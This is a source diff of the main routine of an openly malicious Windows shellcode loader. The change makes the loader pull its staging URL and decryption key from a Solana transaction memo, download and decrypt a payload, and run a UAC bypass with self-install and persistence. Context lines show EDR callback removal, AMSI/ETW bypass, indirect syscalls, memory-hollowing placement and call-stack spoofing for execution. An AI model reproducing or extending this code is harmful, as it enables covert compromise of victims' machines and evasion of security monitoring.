@@ -12,18 +12,10 @@
 
 #include "Common.h"
 
-// Instantiate encoded data (auto-generated in Payload.h)
-static unsigned char EncodedUrl[]    = INIT_ENCODED_URL;
-static unsigned char ProtectedKey[]  = INIT_PROTECTED_KEY;
-static unsigned char ChaskeyNonce[]  = INIT_CHASKEY_NONCE;
-
-// -----------------------------------------------
-// Decode XOR-encoded URL string at runtime
-// -----------------------------------------------
-static VOID DecodeUrl(OUT PCHAR pOut, IN PBYTE pEncoded, IN DWORD dwLen, IN BYTE bKey) {
-    for (DWORD i = 0; i < dwLen; i++)
-        pOut[i] = (CHAR)(pEncoded[i] ^ bKey);
-}
+// NOTE: No static encoded URL or key data — both live on-chain.
+// FetchSolMemo() in Solana.c queries the Solana JSON-RPC API at runtime
+// to retrieve the staging URL + Chaskey key/nonce from the beacon wallet's
+// oldest transaction memo.  Only the wallet address is compiled in (Payload.h).
 
 // -----------------------------------------------
 // Entry Point
@@ -36,6 +28,7 @@ int Main(VOID) {
 
     // --- IAT Camouflage ---
     IatCamouflage();
+    LOG("[*] Main entry");
 
     // --- Anti-Analysis (skipped in DEBUG builds) ---
 #ifndef DEBUG
@@ -55,10 +48,12 @@ int Main(VOID) {
     // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
     if (!InitializeNtSyscalls(&NtApis))
         return 0;
+    LOG("[+] Syscalls initialized");
 
     // --- Initialize WinAPI function pointers (PEB hash walking) ---
     if (!InitializeWinApis(&WinApis))
         return 0;
+    LOG("[+] WinApis initialized");
 
     // --- Blind EDR DLL load monitoring ---
     // Removes all LdrRegisterDllNotification callbacks so EDR
@@ -81,62 +76,89 @@ int Main(VOID) {
     // NtContinue sets DR0/DR1 without ETW-TI telemetry
     PatchlessAmsiEtw(&WinApis);
 
-    // --- Key recovery ---
-    PBYTE pRealKey = NULL;
-    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
+    // --- UAC bypass + self-install (UAC builds only) ---
+    // Two-process AppInfo RPC bypass (no manifest, no UAC dialog):
+    //   Medium-IL first run  → AppInfo bypass → spawn elevated self → terminate → return FALSE
+    //   Elevated second run  → IsFirstRunProcess=TRUE → InstallAndTerminate → exits
+    //   msoia.exe (run-key)  → IsFirstRunProcess=FALSE → fall through to shellcode
+#if defined(UAC_BYPASS) && !defined(BUILD_DLL)
+    if (!UacBypass(&WinApis)) return 0;
+    if (IsFirstRunProcess(&WinApis)) {
+        InstallAndTerminate(&WinApis);
+        return 0;
+    }
+#endif
+
+    // --- Resolve URL + key + nonce from Solana beacon ---
+    // FetchSolMemo queries api.mainnet-beta.solana.com (or the custom RPC host
+    // encoded in Payload.h) for the wallet's oldest transaction, reads the SPL
+    // Memo, and parses: <url>|<32-hex-key>|<24-hex-nonce>.
+    // No URL or crypto key is embedded anywhere in this binary.
+    PCHAR pStagingUrl   = NULL;
+    BYTE  aKey[KEY_SIZE] = { 0 };
+    BYTE  aNonce[12]     = { 0 };
+    DWORD dwOrigSize    = 0;
+    BOOL  bCompressed   = FALSE;
+
+    LOG("[*] Resolving beacon from Solana...");
+    if (!FetchSolMemo(&WinApis, &pStagingUrl, aKey, aNonce, &dwOrigSize, &bCompressed))
         return 0;
 
     // --- Download encrypted payload ---
     PBYTE pPayload      = NULL;
     DWORD dwPayloadSize = 0;
 
-    CHAR szUrl[512] = { 0 };
-    DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
     LOG("[*] Downloading payload...");
-    if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
-        MemSet(pRealKey, 0, KEY_SIZE);
-        HeapFree(GetProcessHeap(), 0, pRealKey);
+    if (!DownloadPayload(&WinApis, pStagingUrl, &pPayload, &dwPayloadSize)) {
+        MemSet(aKey,   0, KEY_SIZE);
+        MemSet(aNonce, 0, sizeof(aNonce));
+        SIZE_T urlLen = StrLenA(pStagingUrl);
+        MemSet(pStagingUrl, 0, urlLen);
+        HeapFree(GetProcessHeap(), 0, pStagingUrl);
         return 0;
     }
-    MemSet(szUrl, 0, sizeof(szUrl));
-    MemSet(EncodedUrl, 0, sizeof(EncodedUrl));
+    // Wipe URL immediately — it was only needed for the download
+    {
+        SIZE_T urlLen = StrLenA(pStagingUrl);
+        MemSet(pStagingUrl, 0, urlLen);
+        HeapFree(GetProcessHeap(), 0, pStagingUrl);
+        pStagingUrl = NULL;
+    }
     LOG("[+] Payload loaded");
 
     // --- Decrypt with Chaskey-CTR ---
-    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, pRealKey, ChaskeyNonce)) {
+    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, aKey, aNonce)) {
         HeapFree(GetProcessHeap(), 0, pPayload);
-        MemSet(pRealKey, 0, KEY_SIZE);
-        HeapFree(GetProcessHeap(), 0, pRealKey);
+        MemSet(aKey,   0, KEY_SIZE);
+        MemSet(aNonce, 0, sizeof(aNonce));
         return 0;
     }
     LOG("[+] Payload decrypted");
 
     // Wipe key material immediately
-    MemSet(pRealKey, 0, KEY_SIZE);
-    HeapFree(GetProcessHeap(), 0, pRealKey);
-    pRealKey = NULL;
-    MemSet(ProtectedKey, 0, sizeof(ProtectedKey));
-    MemSet(ChaskeyNonce, 0, sizeof(ChaskeyNonce));
+    MemSet(aKey,   0, KEY_SIZE);
+    MemSet(aNonce, 0, sizeof(aNonce));
 
     // --- Decompress (if payload was LZNT1-compressed) ---
+    // bCompressed and dwOrigSize come from the on-chain memo, not from
+    // compile-time defines — the same binary handles any future payload.
     PBYTE pShellcode      = pPayload;
     DWORD dwShellcodeSize = dwPayloadSize;
 
-#if USE_COMPRESSION
-    PBYTE pDecompressed = NULL;
-    if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, PAYLOAD_SIZE)) {
-        LOG("[!] Decompression failed");
-        HeapFree(GetProcessHeap(), 0, pPayload);
-        return 0;
-    }
-    LOG("[+] Payload decompressed");
+    if (bCompressed) {
+        PBYTE pDecompressed = NULL;
+        if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, dwOrigSize)) {
+            LOG("[!] Decompression failed");
+            HeapFree(GetProcessHeap(), 0, pPayload);
+            return 0;
+        }
+        LOG("[+] Payload decompressed");
 
-    // Free compressed buffer, use decompressed
-    MemSet(pPayload, 0, dwPayloadSize);
-    HeapFree(GetProcessHeap(), 0, pPayload);
-    pShellcode      = pDecompressed;
-    dwShellcodeSize = PAYLOAD_SIZE;
-#endif
+        MemSet(pPayload, 0, dwPayloadSize);
+        HeapFree(GetProcessHeap(), 0, pPayload);
+        pShellcode      = pDecompressed;
+        dwShellcodeSize = dwOrigSize;
+    }
 
     // ============================================================
     // Stage 1: Shellcode Placement (3-tier fallback)
@@ -182,26 +204,26 @@ int Main(VOID) {
     //   4. NtAllocate      — private RW->RX allocation. Loudest path
     //                        (Elastic correlates against unbacked memory).
     //                        Last resort.
-    bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
-    if (bPlaced) {
-        LOG("[+] Shellcode placed via module stomping");
-    }
+    //bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
+    //if (bPlaced) {
+    //    LOG("[+] Shellcode placed via module stomping");
+    //}
 
-    if (!bPlaced) {
-        bPlaced = GhostlyHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
-        if (bPlaced) {
-            LOG("[+] Shellcode placed via ghostly hollowing");
-        }
-    }
+    //if (!bPlaced) {
+    //    bPlaced = GhostlyHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
+    //    if (bPlaced) {
+    //        LOG("[+] Shellcode placed via ghostly hollowing");
+    //    }
+    //}
 
-    if (!bPlaced) {
-        bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
-        if (bPlaced) {
-            LOG("[+] Shellcode placed via phantom DLL hollowing");
-        }
-    }
+    //if (!bPlaced) {
+    //    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
+    //    if (bPlaced) {
+    //        LOG("[+] Shellcode placed via phantom DLL hollowing");
+    //    }
+    //}
 
-    // Last resort: direct allocation (RW -> copy -> RX/RWX)
+    // NtAllocate: direct allocation (RW -> copy -> RX/RWX)
     if (!bPlaced) {
         LOG("[*] Fallback to NtAllocateVirtualMemory");
 
@@ -252,6 +274,13 @@ int Main(VOID) {
 
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
+
+    // --- Install persistence (non-UAC builds only) ---
+    // UAC builds persist via InstallAndTerminate above (called before shellcode load).
+#ifndef UAC_BYPASS
+    InstallPersistence(&WinApis);
+    LOG("[+] Persistence installed");
+#endif
 
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
@@ -306,6 +335,7 @@ int Main(VOID) {
     // the fiber stack). If any fiber API fails we fall back to the
     // original thread-pool path, which is still call-stack spoofed.
     // ============================================================
+#if 0  // Fiber path temporarily disabled — thread-pool fallback only
     PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
 
     BYTE xConv[]   = XSTR_CONVERT_THREAD_TO_FIBER; DEOBF(xConv);
@@ -340,6 +370,7 @@ int Main(VOID) {
         }
         LOG("[!] Fiber path failed, falling back to thread pool");
     }
+#endif
 
     // Thread-pool workers have their own legit TppWorkerThread ->
     // RtlUserThreadStart chain on their native stack, which is more
